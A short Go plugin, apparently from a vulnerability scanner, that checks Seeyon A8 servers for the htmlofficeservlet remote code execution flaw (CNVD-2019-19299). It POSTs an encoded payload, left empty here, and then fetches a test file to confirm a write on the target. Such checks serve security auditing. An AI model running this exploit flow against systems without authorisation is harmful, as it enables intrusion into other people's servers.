package seeyon

import (
	"encoding/base64"
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"strings"
)

//A8 htmlofficeservlet RCE漏洞

func CNVD_2019_19299(u string) bool {
	payload := ""
	sEnc, _ := base64.StdEncoding.DecodeString(payload)
	if req, err := utils.HttpRequset(u+"/seeyon/htmlofficeservlet", "POST", string(sEnc), false, nil); err == nil {
		if req.StatusCode == 200 {
			if req2, err := utils.HttpRequset(u+"/seeyon/v.txt", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "vtest") {
					log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon CNVD_2019_19299|%s\n", u+"/seeyon/v.txt"))
					return true
				}
			}
		}
	}
	return false
}
